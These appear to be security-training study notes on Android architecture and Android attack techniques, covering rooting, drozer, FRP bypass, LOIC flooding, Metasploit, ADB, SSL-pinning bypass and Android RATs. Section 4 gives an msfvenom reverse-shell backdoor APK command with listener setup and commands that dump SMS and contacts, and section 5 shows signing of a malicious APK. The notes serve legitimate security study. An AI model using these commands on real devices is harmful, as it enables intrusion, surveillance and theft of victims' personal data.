## 1. Android OS & Architecture

Source: [https://developer.android.com](https://developer.android.com)

Android relies on the Linux kernel and comprises a software stack:
1.  **System Apps:** Applications at the top layer (dialer, email, camera). Mostly written in Java.
2.  **Java API Framework:** Exposes platform functions via APIs (Content Providers, View System, Activity Manager, Location Manager).
3.  **Native C/C++ Libraries:** Hardware-specific libraries (WebKit, Open Max AL, Libc, Media Framework, OpenGL ES, SQLite, SSL).
4.  **Android Runtime (ART):** Includes core libraries and the ART virtual machine (AOT/JIT compilation, garbage collection, DEX files).
5.  **Hardware Abstraction Layer (HAL):** Interfaces hardware capabilities to the Java API framework (audio, camera, Bluetooth).
6.  **Linux Kernel:** Low-level device drivers (IPC binder, power management, security management).

*Android provides persistent data storage options:* Shared Preferences, Internal Storage, External Storage, SQLite, Network Connection. *RenderScript* provides computation acceleration.

## 2. Android Device Administration API

Provides system-level features to enforce security policies, useful in enterprise/BYOD settings.
**Supported Policies:**
*   Password requirements (length, alphanumeric, complex, expiration, history).
*   Maximum failed password attempts (wipes data/factory reset).
*   Maximum inactivity time lock.
*   Require storage encryption.
*   Disable camera.

## 3. Android Rooting

Overcoming restrictions imposed by manufacturers to gain privileged control ("root access"). Involves exploiting firmware vulnerabilities and copying the `su` binary to `/system/xbin/su` with `chmod` permissions.
*   **Pros:** Modify system files, remove bloatware, low-level hardware access, improve performance.
*   **Cons:** Voids warranty, bricking the device, malware infection.

### Rooting Tools
*   **KingoRoot** (https://www.kingoapp.com)
    *   *With PC:* Enable USB Debugging -> Connect -> Click ROOT.
    *   *Without PC:* Enable "Unknown Sources" -> Install KingoRoot.apk -> Click "One Click Root".
*   **One Click Root** (https://oneclickroot.com)
*   **Other Tools:** TunesGo, RootMaster, Magisk Manager, iRoot.

## 4. Hacking Android Devices (Tools & Methodologies)

### Identifying Attack Surfaces (Using `drozer`)
`drozer` assesses Android devices in production state without USB debugging via an agent and console.
*   **Fetch package info:**
    *   `dz> run app.package.list` (Lists all packages)
    *   `dz> run app.package.list -f <string_name>`
    *   `dz> run app.package.info -a <package_name>`
*   **Identify Attack Surface:**
    *   `dz> run app.package.attacksurface <package_name>` (Lists exported activities, services, broadcast receivers)
    *   `dz> run app.activity.info -a <package_name>`
*   **Launch Activities:**
    *   `dz> run app.activity.start --component <package_name> <activity_name>`

### Bypassing FRP (Factory Reset Protection)
*   **Tool:** **4ukey** (https://www.tenorshare.net) or Octoplus FRP.
*   **Process:** Connect device -> Click "Remove Google Lock (FRP)" -> Select OS version -> Follow instructions (e.g., dial `*#0*#` for test menu) -> Allow USB debugging.

### Hacking with zANTI and Kali NetHunter
*   **zANTI** (https://www.zimperium.com): Android app for Spoofing MAC, MITM/DoS, redirecting HTTP/HTTPS, hijacking sessions, and replacing images.
*   **Kali NetHunter** (https://www.kali.org): Suite for HID keyboard attacks, BadUSB, Evil AP MANA, and generating Metasploit payloads.

### Launch DoS Attack using LOIC
*   **LOIC (Low Orbit Ion Cannon):** Android app to perform UDP/TCP/HTTP floods. Input Target IP, select Method, set threads, click START.

### Hacking with Orbot Proxy
*   **Orbot** (https://orbot.app): Proxy app using Tor to encrypt traffic and hide attacker identity.

### Exploiting Device through ADB Using PhoneSploit Pro
*   **PhoneSploit Pro** (https://github.com/AzeemIdrisi/PhoneSploit-Pro): Exploits devices with TCP debugging enabled on port 5555. Features: screen capture, dumping info, installing apps, port forwarding.

### Man-in-the-Disk (MITD) Attack
Exploits improper security in external storage usage. 
*   **Process:** Victim downloads legitimate app -> App requests update -> Attacker monitors external storage and injects malicious code into the update -> App fetches tampered code.

### Spearphone Attack
Exploits hardware-based motion sensors (accelerometer) to record loudspeaker data/reverberations without permissions. Breaches speech privacy, gender classification, and captures voice assistant outputs.

### Camera/Microphone Hijacking
*   **Camfecting:** Infecting target with RAT to capture webcam/mic and disable the camera light.
*   **Android Camera Hijack:** Bypassing permissions (`CAMERA`, `RECORD_AUDIO`, `ACCESS_LOCATION`) to maintain persistent connection.
*   **Tools:** **StormBreaker** (https://github.com/ultrasecurity/Storm-Breaker), CamPhish, HACK-CAMERA, E-TOOL, CamOver, CAM-DUMPER.

### Exploiting Android Devices Using Metasploit
1.  Search exploits: `msf > search type:exploit platform:android`
2.  Search payloads: `msf > search type:payload platform:android`
3.  Build custom payload:
    `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local Host IP Address> R > Desktop/Backdoor.apk`
4.  Setup listener:
    *   `msf > use exploit/multi/handler`
    *   `msf > set PAYLOAD android/meterpreter/reverse_tcp`
    *   `msf > set LHOST <Local Host IP Address>`
    *   `msf > set LPORT <Port No>`
    *   `msf > exploit`
5.  Post-Exploitation Commands: `sysinfo`, `ipconfig`, `pwd`, `ps`, `dump_sms`, `dump_calllog`, `dump_contacts`, `webcam_list`.

## 5. Analyzing Android Devices (ADB, Reverse Engineering)

Source: [https://mas.owasp.org](https://mas.owasp.org)

### Accessing Android Device via Shell (ADB)
Requires Developer Mode and USB debugging.
1.  Connect via USB cable.
2.  Listen for TCP/IP: `adb tcpip 5555`
3.  Disconnect USB and connect via Wi-Fi: `adb connect <device_ip_address>`
4.  Confirm connection: `adb devices`
5.  Open shell: `adb shell`

### Enumerate Installed Applications
*   `$ adb shell pm list packages`
*   `$ adb shell pm list packages -3 -f` (Third-party apps only)
*   **Using Frida:** `$ frida-ps -Uai` (-a: all, -i: installed, -U: USB device)

### Disassemble App Package (`apktool`)
*   `$ apktool d <App_package>.apk`
*   `$ tree` (Examines AndroidManifest.xml, META-INF, classes.dex, etc.)

### Monitoring Logs & Connections
*   Logs: `$ adb logcat > logcat.log`
*   Open Files: `# lsof -p <pid>`
*   Open Connections: `# netstat -p | grep <pid>`

### Signing Malicious APK
*   Generate key: `keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000`
*   Sign APK: `apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious file>.apk`

### Bypass SSL Pinning (Reverse Engineering)
1.  Decompile: `apktool d <application_name.apk>`
2.  Modify **smali** code (Android JVM assembly) to bypass functions like `checkClientTrusted` / `checkServerTrusted`.
3.  Recompile: `apktool b <application_directory_name>`

### Hooking (Frida)
Tamper with runtime behavior.
*   Command: `# frida -U -l <Hooking_file.js> -f <package_name>`

### Tap ’n Ghost Attack
Exploits NFC and capacitive touchscreens to take remote control.
*   **Tag-based Adaptive Ploy (TAP):** Triggers device to visit a URL via NFC emulator.
*   **Ghost Touch Generator:** Forces victim to touch the cancel button (which acts as a permit button).

### Advanced SMS Phishing (OTA Provisioning)
Exploits Over-the-Air (OTA) provisioning. Attacker obtains victim's IMSI and sends malicious PIN and authenticated message to modify message/proxy servers.

## 6. Android Malware & Hacking Tools

### Android Malware
*   **Mamont:** Banking Trojan masquerading as Google Chrome. Requests SMS/Call permissions and displays fake cash prize claims to steal credit card details.
*   **Other Malware:** SecuriDropper, Dwphon, DogeRAT, Tambir, SoumniBot.

### General Android Hacking Tools
*   **AndroRAT** (https://github.com/karma9874/AndroRAT): Client/Server Java/Python backdoor. Auto-starts on boot. Extracts location, SIM details.
*   **Ghost Framework** (https://github.com/EntySec/Ghost): Post-exploitation ADB tool. Emulates button presses, extracts WPA_supplicant, dumps logs.
*   **Other Tools:** hxp_photo_eye, Gallery Eye, mSpy, Hackingtoolkit, SET.

### Android-based Sniffers
*   **PCAPdroid** (https://play.google.com): Captures traffic without root by simulating a VPN. Processes data locally.
*   **Other Sniffers:** NetCapture, Intercepter-NG, Packet Capture, Sniffer Wicap 2 Demo, Reqable API Testing.
